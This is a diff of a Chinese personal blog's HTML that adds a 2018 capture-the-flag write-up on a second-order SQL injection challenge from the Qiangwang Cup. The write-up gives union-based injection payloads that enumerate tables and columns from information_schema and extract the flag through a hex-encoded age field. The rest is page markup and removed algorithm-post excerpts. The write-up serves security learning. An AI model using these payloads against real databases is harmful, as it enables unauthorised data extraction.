@@ -9,7 +9,7 @@
 <head>
     <meta http-equiv="content-type" content="text/html; charset=utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" >
-    <title>ZclusLLoye&#39;s Blog</title>
+    <title>记一次有趣的二次注入 · ZclusLLoye&#39;s Blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -251,12 +251,23 @@
 </head>
 
     
+        <body class="post-body">
+    
     
 <header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >ZclusLLoye&#39;s Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">记一次有趣的二次注入</a>
+            </div>
+    </div>
     
     <a class="home-link" href=/>ZclusLLoye's Blog</a>
 </header>
@@ -268,146 +279,110 @@
 
 
 
-
+height:50vh;
 
 >
     
     <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
             
-    <div class="site-intro-img" style="background-image: url(/)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
     <div class="site-intro-placeholder"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
             
+            记一次有趣的二次注入
+            <!-- 404 -->
+            
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
+            
+            <!-- 404 -->
+            
         </p>
         <!-- 文章页meta -->
+        
+            <!-- 文章页标签  -->
+            
+                <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = web>web</a>
+    
+</div>
+            
+            <div class="post-intro-meta">
+                <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                <span class="post-intro-time">2018/03/29</span>
+                
+                <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                    <span class="iconfont-archer">&#xe602;</span>
+                    <span id="busuanzi_value_page_pv"></span>
+                </span>
+                
+                <span class="shareWrapper">
+                    <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                    <span class="shareText">Share</span>
+                    <ul class="shareList">
+                        <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                            <div class="share-qrcode"></div>
+                        </li>
+                        <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                        <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                        <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                        <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                    </ul>
+                </span>
+            </div>
         
     </div>
 </div>
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
 
         <div class="container container-unloaded">
-            <main class="main index-page">
+            <main class="main post-page">
+    <article class="article-entry">
+        <p>上周强网杯和安恒杯结束了，一直没有时间整理比赛中学习的知识，其实会做的题也不多，但学习的确实挺多，今天就来聊聊强网杯的一道较为简单的注入题。<br>题目是一道二次注入类型。二次注入是为了预防SQL注入攻击，而将输入到应用程序中的某些数据进行了“转义（escape）”，但是这些数据却又在“未被转义（Unescaped）”的查询窗体中重复使用。例如下面这道题目：<br>刚开始就给你一个注册页面，注册发现age参数存在注入点<br><img src="https://miao.su/images/2018/03/30/4efc9e.png" alt="4efc9e.png"><br>由于要求age必须为数字便采用hex绕过。随后便是常规的注入手法。<br><br>先判断列数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">222 order by x#   //x为数字</span><br></pre></td></tr></table></figure><br>随后发现222 union select 1,2,3,4#依旧只有第一个参数有回显，便用and 1=2把222的参数回显注释掉<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">222 and 1=2 union select 1,2,3,4# //发现联合查询的第二个参数有回显</span><br><span class="line">222 and 1=2 union select 1,table_name,3,4 from information_schema.tables where table_schema=database()# //表名</span><br><span class="line">222 and 1=2 union select 1,column_name,3,4 from information_schema.columns where table_schema=database()#  //列名</span><br></pre></td></tr></table></figure><br><img src="https://miao.su/images/2018/03/30/85f176.png" alt="85f176.png"><br>得到表名和列名都是flag。接下来字段：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">222 and 1=2 union select 1,flag,3,4 from flag# </span><br></pre></td></tr></table></figure><br><img src="https://miao.su/images/2018/03/30/9c298f.png" alt="9c298f.png"><br>拿到flag。<br>这次强网杯比赛中学到了新的注入姿势，和队友的比赛时也学到了其他许多东西。下次聊聊php弱类型，还有常见的php类型绕过。</p>
+
+    </article>
+    <!-- 前后页  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2018/03/30/php-weak1/" title= PHP弱类型总结 >
+                    <div class="nextTitle">PHP弱类型总结</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2018/03/23/polynomial/" title= 单向链表的学习 >
+                    <div class="prevTitle">单向链表的学习</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
     
     
+    <!--PC版-->
+
+    <!--PC版-->
+
+
     
-        <article class="index-post">
-            <a class="abstract-title" href = "/2018/03/23/polynomial/" >
-                
-                    <span>单向链表的学习</span>
-            </a>
-            <div class="abstract-content">
-                最近慢慢地在学习算法，数据结构也越来越难理解，正好碰见一道题目来复习单向链表，使用一元多项式表示多项式并求和。对于链表，结构体中得包含指向下一个节点的指针。这道题的重点在于如何去表示多项式，并且如何去比较指数并相加。先定义结构体并将结构体指针化：123456struct node &#123;    float coef; //系数...
-            </div>
-            <div class="abstract-post-meta">
-                <!-- date  -->
-                <div class="abstract-date">
-                    <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/03/23</span>
-                </div>
-                <!-- tags  -->
-                
-                <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = 算法>算法</a>
-    
-</div>
-                
-            </div>
-        </article>
-    
-    
-    
-        <article class="index-post">
-            <a class="abstract-title" href = "/2018/03/14/shuffle/" >
-                
-                    <span>常见的洗牌算法</span>
-            </a>
-            <div class="abstract-content">
-                学了半年多编程，多多少少也见过好几种排序方法，选择排序，插入排序，冒泡排序等等。而洗牌算法的目的就是将有序的数组打乱。那么，怎么样洗牌才能使所有可能性概率都是一致的呢？我认为要等概论打乱n张牌，那么就得使某一种打乱的方法出现的可能性为1/n！。那么怎么实现呢？我的第一想法是利用伪随机数来进行打乱。例如，我们要打乱10张牌，那么从第一...
-            </div>
-            <div class="abstract-post-meta">
-                <!-- date  -->
-                <div class="abstract-date">
-                    <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/03/14</span>
-                </div>
-                <!-- tags  -->
-                
-                <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = 算法>算法</a>
-    
-</div>
-                
-            </div>
-        </article>
-    
-    
-    
-        <article class="index-post">
-            <a class="abstract-title" href = "/2018/03/10/maze/" >
-                
-                    <span>使用递归算法解决迷宫问题</span>
-            </a>
-            <div class="abstract-content">
-                最近看递归的问题有点多，也逐渐有了自己的想法和思路。对于递归问题，其实让人不理解的无非是它的逻辑思路，遇到不理解的地方在纸上写写逻辑，问题就迎刃而解了。
-代码部分12345678910111213141516171819202122232425262728293031323334353637383940414243444546474...
-            </div>
-            <div class="abstract-post-meta">
-                <!-- date  -->
-                <div class="abstract-date">
-                    <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/03/10</span>
-                </div>
-                <!-- tags  -->
-                
-                <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = 算法>算法</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = C语言>C语言</a>
-    
-</div>
-                
-            </div>
-        </article>
-    
-    
-    
-        <article class="index-post">
-            <a class="abstract-title" href = "/2018/03/10/resolve-number/" >
-                
-                    <span>实现整数的所有划分数</span>
-            </a>
-            <div class="abstract-content">
-                本来以为已经弃C语言的坑了，没想到因为课程原因开始学习算法了= =！还是不得不感叹时间飞逝，从开始只会写简单小程序到现在会使用简单算法的程序，想想半年前刚入协会的时候我连一个循环都写不出来….
-说正事= =!第一个算法案例就是递归问题：利用递归来实现整数的划分数，并输出结果。自己也想了很久，网上也找了几份源码，对自己现在写的不是很满...
-            </div>
-            <div class="abstract-post-meta">
-                <!-- date  -->
-                <div class="abstract-date">
-                    <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/03/10</span>
-                </div>
-                <!-- tags  -->
-                
-                <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = 算法>算法</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = C语言>C语言</a>
-    
-</div>
-                
-            </div>
-        </article>
-    
-    <!-- paginator  -->
-    
+    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -483,6 +458,22 @@
 </footer>
     </div>
     <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        
+    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -684,6 +675,8 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
     
     </body>
 </html>
